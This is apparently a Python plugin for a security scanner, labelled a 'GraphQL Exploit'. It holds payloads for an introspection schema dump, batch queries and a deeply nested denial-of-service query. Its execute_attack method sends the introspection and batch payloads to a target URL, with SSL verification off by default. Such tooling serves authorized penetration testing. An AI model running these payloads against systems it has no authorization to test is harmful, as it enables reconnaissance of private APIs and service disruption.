"""
GraphQL Exploit Plugin

Provides exploit capabilities for GraphQL security issues:
- Introspection-based schema dump
- Batch query attacks
- Nested query DoS
- Field suggestion enumeration
"""

import sys
import os
import json
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_INTROSPECTION_QUERY = {
    "query": (
        "{ __schema { queryType { name } types { name kind fields { name "
        "type { name kind ofType { name kind } } } } } }"
    )
}

_BATCH_QUERY = [
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
]

_NESTED_DOS_QUERY = {
    "query": "{ a { b { c { d { e { f { g { h { __typename } } } } } } } } }"
}


class GraphQLPlugin(ExploitPlugin):
    """GraphQL exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'graphql'

    @property
    def name(self) -> str:
        return 'GraphQL Exploit'

    @property
    def description(self) -> str:
        return 'GraphQL exploit: introspection dump, batch queries, nested query DoS.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return GraphQL attack payloads as JSON strings."""
        return [
            json.dumps(_INTROSPECTION_QUERY),
            json.dumps(_BATCH_QUERY),
            json.dumps(_NESTED_DOS_QUERY),
        ]

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Attempt GraphQL introspection and batch queries."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'graphql',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        headers = {'Content-Type': 'application/json'}

        # Try introspection
        try:
            resp = requests.post(
                target_url,
                json=_INTROSPECTION_QUERY,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl,
            )
            body = resp.json() if resp.headers.get('Content-Type', '').startswith('application/json') else {}
            if 'data' in body and '__schema' in str(body.get('data', {})):
                return {
                    'success': True,
                    'vulnerability_type': 'graphql',
                    'attack': 'introspection',
                    'evidence': 'GraphQL introspection enabled â€” full schema exposed',
                    'schema_excerpt': str(body)[:500],
                    'message': 'GraphQL introspection confirmed',
                }
        except Exception as e:
            logger.debug(f"GraphQL introspection error: {e}")

        # Try batch query
        try:
            resp = requests.post(
                target_url,
                json=_BATCH_QUERY,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl,
            )
            if resp.status_code == 200 and isinstance(resp.json(), list):
                return {
                    'success': True,
                    'vulnerability_type': 'graphql',
                    'attack': 'batch_query',
                    'evidence': 'GraphQL batch queries accepted',
                    'message': 'GraphQL batch query attack confirmed',
                }
        except Exception as e:
            logger.debug(f"GraphQL batch query error: {e}")

        return {
            'success': False,
            'error': 'No GraphQL vulnerability confirmed',
            'vulnerability_type': 'graphql',
        }
